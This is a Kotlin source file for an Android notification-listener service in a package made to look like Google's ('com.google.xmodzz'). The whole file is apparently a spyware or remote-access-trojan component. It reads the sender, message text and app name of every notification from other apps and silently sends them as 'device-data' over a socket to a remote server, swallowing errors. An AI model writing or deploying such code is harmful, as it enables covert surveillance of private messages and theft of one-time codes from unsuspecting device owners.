package com.google.xmodzz

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class NotifListenerService : NotificationListenerService() {

    private val skipPackages = setOf("android", "com.android.systemui", "com.google.xmodzz", "com.google.android.gms")

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkgName = sbn.packageName
        if (pkgName in skipPackages) return

        val notif = sbn.notification ?: return
        val extras = notif.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                ?: ""

        if (title.isBlank() && text.isBlank()) return

        val appName = try {
            packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkgName, 0)).toString()
        } catch (e: Exception) { pkgName }

        val timeMillis = System.currentTimeMillis()

        val payload = JSONObject().apply {
            put("action", "notif_list")
            put("appName", appName)
            put("sender", title)
            put("message", text)
            put("time", timeMillis)
            put("pkgName", pkgName)
        }

        try {
            if (SocketHolder.socket != null && SocketHolder.socket!!.connected()) {
                SocketHolder.socket!!.emit("device-data", payload)
            }
        } catch (e: Exception) { }
    }
}
